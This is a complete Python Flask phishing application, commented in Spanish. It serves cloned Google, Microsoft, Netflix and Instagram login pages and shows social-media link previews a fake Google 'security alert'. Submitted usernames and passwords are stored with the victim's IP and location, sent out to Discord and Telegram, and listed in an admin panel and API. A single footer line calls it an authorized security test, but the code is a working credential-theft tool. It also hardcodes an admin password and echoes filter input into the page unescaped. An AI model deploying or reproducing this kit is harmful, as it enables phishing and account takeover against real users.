#!/usr/bin/env python3
import os
import sqlite3
import json
import requests
import hashlib
import re
import logging
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, jsonify, abort, session

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuración de seguridad de sesión
app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
app.config.update(
    SESSION_COOKIE_SECURE=True,  # Solo HTTPS
    SESSION_COOKIE_HTTPONLY=True,  # No accesible por JavaScript
    SESSION_COOKIE_SAMESITE='Lax',  # Protección CSRF
    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)  # Sesión expira en 2 horas
)

# Config
CONFIG = {
    'discord_webhook': None,
    'telegram_token': None,
    'telegram_chat': None,
    'redirect_url': 'https://www.google.com',
    'template': 'google',
    'api_key': 'cambia-esta-clave',
    'admin_password': 'triple777',
    'max_login_attempts': 5,  # Límite de intentos de login
    'cleanup_days': 30  # Días para eliminar credenciales antiguas
}

# Almacenar intentos de login por IP (con timestamp para bloqueo temporal)
login_attempts = {}

def is_ip_blocked(ip):
    """Verifica si una IP está bloqueada y si ya pasó el tiempo de bloqueo"""
    if ip in login_attempts:
        attempts, block_time = login_attempts[ip]
        if attempts >= CONFIG.get('max_login_attempts', 5):
            # Bloqueo de 5 minutos
            if datetime.now() - block_time < timedelta(minutes=5):
                return True
            else:
                # Resetear después de 5 minutos
                del login_attempts[ip]
    return False

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
            logger.info("Configuración cargada desde config.json")
    except FileNotFoundError:
        logger.warning("config.json no encontrado, usando configuración por defecto")
    except Exception as e:
        logger.error(f"Error al cargar config.json: {e}")

def init_db():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                username TEXT,
                password TEXT,
                user_agent TEXT,
                referer TEXT,
                geo_location TEXT,
                hash TEXT UNIQUE,
                viewed INTEGER DEFAULT 0
            )
        ''')
        # Crear índices para mejorar el rendimiento
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON credentials(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_ip ON credentials(ip)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_username ON credentials(username)')
        conn.commit()
        conn.close()
        logger.info("Base de datos inicializada correctamente")
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}")

def cleanup_old_credentials(days=None):
    """Elimina credenciales con más de X días"""
    if days is None:
        days = CONFIG.get('cleanup_days', 30)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            DELETE FROM credentials 
            WHERE datetime(timestamp) < datetime('now', ?)
        ''', (f'-{days} days',))
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        if deleted > 0:
            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
        return deleted
    except Exception as e:
        logger.error(f"Error en cleanup de credenciales: {e}")
        return 0

def get_client_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
        if r.get('status') == 'success':
            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
    except Exception as e:
        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
    return "Unknown"

def is_social_crawler(ua):
    social_bots = ['facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot', 
                   'telegrambot', 'discord', 'slackbot', 'pinterest', 'redditbot']
    return any(bot in ua.lower() for bot in social_bots)

def validate_input(text):
    """Valida que el input no contenga caracteres peligrosos"""
    if text:
        # Solo letras, números, @, ., -, _ y espacios
        return re.match(r'^[a-zA-Z0-9@.\-_\s]+$', text) is not None
    return True

def send_notifications(data):
    if CONFIG.get('discord_webhook'):
        try:
            embed = {
                "title": "🎯 Nueva Captura",
                "color": 0x00ff00,
                "fields": [
                    {"name": "📍 IP", "value": data['ip'], "inline": True},
                    {"name": "🌍 Ubicación", "value": data['geo'], "inline": True},
                    {"name": "👤 Usuario", "value": f"```{data['username']}```", "inline": False},
                    {"name": "🔑 Contraseña", "value": f"```{data['password'][:20]}...```", "inline": False},
                ],
                "footer": {"text": f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
            }
            requests.post(CONFIG['discord_webhook'], json={"embeds": [embed]}, timeout=5)
            logger.info("Notificación enviada a Discord")
        except Exception as e:
            logger.error(f"Error al enviar notificación a Discord: {e}")
    
    if CONFIG.get('telegram_token') and CONFIG.get('telegram_chat'):
        try:
            msg = f"🎯 *Nueva Captura*\n\n📍 `{data['ip']}`\n🌍 `{data['geo']}`\n👤 `{data['username']}`\n🔑 `{data['password'][:30]}`"
            url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
            requests.post(url, json={"chat_id": CONFIG['telegram_chat'], "text": msg, "parse_mode": "Markdown"}, timeout=5)
            logger.info("Notificación enviada a Telegram")
        except Exception as e:
            logger.error(f"Error al enviar notificación a Telegram: {e}")

def get_template(name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Iniciar sesión</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
        body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:450px;text-align:center}
        .logo{width:75px;margin-bottom:20px}
        h1{font-size:24px;font-weight:400;margin-bottom:10px;color:#202124}
        p{color:#5f6368;margin-bottom:30px}
        input{width:100%;padding:13px 15px;margin-bottom:15px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
        input:focus{outline:none;border-color:#1a73e8}
        button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
        button:hover{background:#1557b0}
        .footer{margin-top:30px;font-size:14px;color:#5f6368}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Iniciar sesión</h1>
        <p>Utiliza tu cuenta de Google</p>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="email">
            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
            <button type="submit">Siguiente</button>
        </form>
        <div class="footer">Prueba de seguridad autorizada</div>
    </div>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Iniciar sesión</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:linear-gradient(120deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;padding:44px;width:100%;max-width:440px;box-shadow:0 4px 20px rgba(0,0,0,0.15)}
        .logo{width:108px;margin-bottom:16px}
        h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
        input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;font-size:15px}
        button{width:100%;padding:12px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer}
        button:hover{background:#005a9e}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Netflix</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
        body{background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:rgba(0,0,0,0.75);padding:60px 68px;width:100%;max-width:450px;border-radius:4px}
        h1{color:white;font-size:32px;margin-bottom:28px;font-weight:700}
        input{width:100%;padding:16px;margin-bottom:16px;background:#333;border:none;border-radius:4px;color:white;font-size:16px}
        button{width:100%;padding:16px;background:#e50914;color:white;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
        button:hover{background:#f40612}
    </style>
</head>
<body>
    <div class="container">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <title>Instagram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
        body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .container{background:white;border:1px solid #dbdbdb;padding:40px;width:100%;max-width:350px;text-align:center}
        .logo{font-size:40px;font-family:'Brush Script MT',cursive;margin-bottom:30px}
        input{width:100%;padding:9px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
        button{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-top:12px}
        button:hover{background:#0081d6}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>'''
    }
    return templates.get(name, templates['google'])

@app.before_request
def handle_bots():
    ua = request.headers.get('User-Agent', '')
    
    if is_social_crawler(ua) and request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Alerta de seguridad">
    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
    <meta property="og:url" content="https://nuevo-acceso-a-tu-cuenta.onrender.com/">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <title>Alerta de seguridad</title>
</head>
<body>
    <h1>Alerta de seguridad</h1>
    <p>Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.</p>
</body>
</html>
'''), 200

@app.route('/')
def index():
    return render_template_string(get_template(CONFIG.get('template', 'google')))

@app.route('/capture', methods=['POST'])
def capture():
    ip = get_client_ip()
    geo = get_geo(ip)
    
    username = request.form.get('email', '') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Validar entrada para prevenir inyecciones
    if not validate_input(username):
        logger.warning(f"Intento de inyección detectado desde {ip}")
        username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
    
    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': request.headers.get('User-Agent', ''),
        'referer': request.headers.get('Referer', ''),
        'geo': geo,
        'hash': hash_str
    }
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['ip'], data['username'], data['password'],
              data['user_agent'], data['referer'], geo, hash_str))
        conn.commit()
        conn.close()
        logger.info(f"Nueva credencial capturada: {username} desde {ip}")
    except Exception as e:
        logger.error(f"Error al guardar credencial: {e}")
    
    send_notifications(data)
    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))

@app.route('/login-credenciales', methods=['GET', 'POST'])
def login_credenciales():
    ip = get_client_ip()
    max_attempts = CONFIG.get('max_login_attempts', 5)
    
    # Verificar si la IP está bloqueada (con tiempo de expiración)
    if is_ip_blocked(ip):
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Acceso Bloqueado</title>
            <style>
                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                .error { color: red; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚫 Acceso Bloqueado</h1>
                <p>Has superado el límite de intentos permitidos.</p>
                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
            </div>
        </body>
        </html>
        ''', 429
    
    if request.method == 'POST':
        password = request.form.get('password')
        if password == CONFIG.get('admin_password', 'triple777'):
            # Login exitoso, resetear intentos
            login_attempts.pop(ip, None)
            session['admin_logged'] = True
            session.permanent = True
            logger.info(f"Login exitoso desde IP {ip}")
            return redirect('/ver-credenciales')
        else:
            # Incrementar intentos fallidos con timestamp
            if ip not in login_attempts:
                login_attempts[ip] = [0, datetime.now()]
            login_attempts[ip][0] += 1
            login_attempts[ip][1] = datetime.now()
            remaining = max_attempts - login_attempts[ip][0]
            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
            
            return render_template_string('''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Acceso Denegado</title>
                <style>
                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                    .error { color: red; margin-top: 10px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔒 Contraseña incorrecta</h1>
                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                    <a href="/login-credenciales">Volver</a>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Acceso a Credenciales</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
            body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { color: #1a73e8; margin-bottom: 20px; font-size: 24px; }
            .lock { font-size: 48px; margin-bottom: 15px; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
            input:focus { outline: none; border-color: #1a73e8; }
            button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background: #1557b0; }
            .footer { margin-top: 20px; color: #666; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="lock">🔐</div>
            <h1>Acceso a Credenciales</h1>
            <p style="color:#666; margin-bottom:20px;">Introduce la contraseña de administrador</p>
            <form method="POST">
                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                <button type="submit">Acceder</button>
            </form>
            <div class="footer">Acceso restringido</div>
        </div>
    </body>
    </html>
    ''')

@app.route('/ver-credenciales')
def ver_credenciales():
    if not session.get('admin_logged'):
        return redirect('/login-credenciales')
    
    # Obtener filtros de la URL
    filter_ip = request.args.get('ip', '')
    filter_username = request.args.get('username', '')
    filter_location = request.args.get('location', '')
    
    query = 'SELECT id, timestamp, ip, username, password, geo_location FROM credentials WHERE 1=1'
    params = []
    
    if filter_ip:
        query += ' AND ip LIKE ?'
        params.append(f'%{filter_ip}%')
    if filter_username:
        query += ' AND username LIKE ?'
        params.append(f'%{filter_username}%')
    if filter_location:
        query += ' AND geo_location LIKE ?'
        params.append(f'%{filter_location}%')
    
    query += ' ORDER BY id DESC'
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
    except Exception as e:
        logger.error(f"Error al leer credenciales: {e}")
        return "<h1>❌ Error al cargar las credenciales</h1>"
    
    if not rows:
        return "<h1>📭 No hay credenciales capturadas aún</h1>"
    
    # Construir HTML con filtros y tabla
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Credenciales Capturadas</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }
            h1 { color: #1a73e8; text-align: center; }
            .logout { float: right; background: #dc3545; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; margin-left: 10px; }
            .logout:hover { background: #c82333; }
            .filters { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .filters input { padding: 8px; margin: 5px; border: 1px solid #ddd; border-radius: 4px; width: 200px; }
            .filters button { padding: 8px 16px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
            .filters button:hover { background: #1557b0; }
            .filters .clear { background: #6c757d; }
            .filters .clear:hover { background: #5a6268; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            th { background: #1a73e8; color: white; padding: 12px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #ddd; }
            tr:hover { background: #f5f5f5; }
            .badge { background: #4CAF50; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
            .delete-btn { background: #dc3545; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 12px; }
            .delete-btn:hover { background: #c82333; }
        </style>
    </head>
    <body>
        <div style="display: flex; justify-content: flex-end;">
            <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
        </div>
        <h1>🔐 Credenciales Capturadas</h1>
        <p style="text-align:center; color:#666;">Total: <strong>"""+str(len(rows))+"""</strong></p>
        
        <div class="filters">
            <form method="GET" style="display: flex; flex-wrap: wrap; align-items: center; gap: 10px;">
                <input type="text" name="ip" placeholder="Filtrar por IP" value="""+request.args.get('ip', '')+""">
                <input type="text" name="username" placeholder="Filtrar por usuario" value="""+request.args.get('username', '')+""">
                <input type="text" name="location" placeholder="Filtrar por ubicación" value="""+request.args.get('location', '')+""">
                <button type="submit">🔍 Filtrar</button>
                <a href="/ver-credenciales" class="clear" style="padding: 8px 16px; background: #6c757d; color: white; border: none; border-radius: 4px; text-decoration: none;">❌ Limpiar</a>
            </form>
        </div>
        
        <table>
            <tr>
                <th>#</th>
                <th>Fecha</th>
                <th>IP</th>
                <th>Ubicación</th>
                <th>Usuario</th>
                <th>Contraseña</th>
                <th>Acción</th>
            </tr>
    """
    
    for r in rows:
        html += f"""
            <tr>
                <td>{r[0]}</td>
                <td>{r[1]}</td>
                <td>{r[2]}</td>
                <td>{r[5]}</td>
                <td><strong>{r[3]}</strong></td>
                <td><span class="badge">{r[4]}</span></td>
                <td>
                    <form action="/api/credentials/{r[0]}" method="POST" style="display:inline;">
                        <input type="hidden" name="_method" value="DELETE">
                        <button type="submit" class="delete-btn" onclick="return confirm('¿Eliminar esta credencial?')">🗑️</button>
                    </form>
                </td>
            </tr>
        """
    
    html += """
        </table>
        <p style="text-align:center; margin-top:20px; color:#999; font-size:14px;">
            Actualizado: """+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"""
        </p>
    </body>
    </html>
    """
    return html

@app.route('/api/credentials/<int:credential_id>', methods=['DELETE', 'POST'])
def delete_credential(credential_id):
    """Eliminar una credencial específica"""
    if not session.get('admin_logged'):
        return jsonify({'error': 'No autorizado'}), 401
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM credentials WHERE id = ?', (credential_id,))
        conn.commit()
        deleted = cursor.rowcount
        conn.close()
        
        if deleted:
            logger.info(f"Credencial {credential_id} eliminada")
            return jsonify({'success': True, 'message': 'Credencial eliminada'})
        else:
            return jsonify({'success': False, 'message': 'Credencial no encontrada'}), 404
    except Exception as e:
        logger.error(f"Error al eliminar credencial: {e}")
        return jsonify({'error': 'Error interno'}), 500

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    logger.info("Sesión cerrada")
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        logger.warning(f"Intento de acceso no autorizado a /api/credentials desde {request.remote_addr}")
        abort(401)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location, viewed FROM credentials ORDER BY id DESC')
        rows = cursor.fetchall()
        cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
        conn.commit()
        conn.close()
        logger.info("API /credentials consultada exitosamente")
    except Exception as e:
        logger.error(f"Error en API /credentials: {e}")
        return jsonify({'error': 'Error interno'}), 500
    
    return jsonify([{
        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
        'password': r[4], 'location': r[5], 'viewed': r[6]
    } for r in rows])

@app.route('/api/stats')
def stats():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        logger.warning(f"Intento de acceso no autorizado a /api/stats desde {request.remote_addr}")
        abort(401)
    
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
        total, unique, new = cursor.fetchone()
        conn.close()
        logger.info("API /stats consultada exitosamente")
    except Exception as e:
        logger.error(f"Error en API /stats: {e}")
        return jsonify({'error': 'Error interno'}), 500
    
    return jsonify({'total': total, 'unique_ips': unique, 'new': new})

@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    """Endpoint para limpieza manual de credenciales antiguas"""
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
    deleted = cleanup_old_credentials(days)
    return jsonify({
        'deleted': deleted,
        'message': f'Eliminadas {deleted} credenciales con más de {days} días',
        'days': days
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok', 
        'time': datetime.now().isoformat(),
        'credentials_count': get_credentials_count()
    })

def get_credentials_count():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

if __name__ == '__main__':
    load_config()
    init_db()
    
    # Limpiar credenciales antiguas al iniciar
    cleanup_old_credentials()
    
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Servidor iniciado en el puerto {port}")
    logger.info(f"Contraseña de administrador: {CONFIG.get('admin_password', 'triple777')}")
    logger.info(f"Límite de intentos de login: {CONFIG.get('max_login_attempts', 5)}")
    logger.info(f"Días para limpieza automática: {CONFIG.get('cleanup_days', 30)}")
    
    app.run(host='0.0.0.0', port=port, debug=False)
